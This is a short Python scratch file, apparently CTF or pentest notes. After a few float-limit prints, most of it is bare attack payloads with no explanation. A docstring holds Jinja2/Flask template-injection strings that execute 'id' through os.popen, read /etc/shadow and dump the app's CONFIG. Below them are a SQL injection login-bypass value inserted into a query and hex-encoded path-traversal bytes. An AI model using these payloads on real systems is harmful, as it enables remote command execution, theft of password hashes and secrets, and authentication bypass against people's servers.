import sys

print(sys.float_info.max)
print(sys.float_info.max+1 == sys.float_info.max)


"""
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{get_flashed_messages.__globals__.__builtins__.open('/etc/shadow').read()}}
{{get_flashed_messages.__globals__.CONFIG}}


"""


username = "' or ''='"
password = "' or ''='"

print(f"SELECT CASE WHEN username='{username}' AND password='{password}' THEN true ELSE false END AS result FROM user;")

print({b'\x2E\x2E\x2F\x74\x65\x73\x74\x2E\x74\x78\x74'})
print(b'\x74\x65\x73\x74\x2E\x70\x79'.decode())
print(bytes("ls", 'utf-8'))
